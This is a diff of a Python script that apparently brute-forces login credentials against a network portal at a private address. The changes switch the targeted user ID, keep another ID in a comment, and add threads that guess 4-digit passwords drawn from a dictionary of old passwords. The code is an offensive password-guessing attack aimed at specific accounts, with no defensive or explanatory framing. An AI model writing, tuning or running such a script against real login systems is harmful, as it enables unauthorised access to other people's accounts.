@@ -8,7 +8,8 @@ url = "http://172.16.0.1/portal/user-authen.php"
 header = {
     "content-type":"application/x-www-form-urlencoded"
 }
-username = 151006
+# username = 109097
+username = 151023
 def result(x):
     df = open('result.txt', 'w')
     df.writelines(str(x))
@@ -53,10 +54,7 @@ Dic.dictionarys = Getoldpassword().read().split(',')
 for i in range(100):
     threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
     threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
-    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
-    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
-    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
-    # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
+    threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
     # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
     # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
     # threading.Thread(target=randomNumber,args=("",4,Dic,)).start()
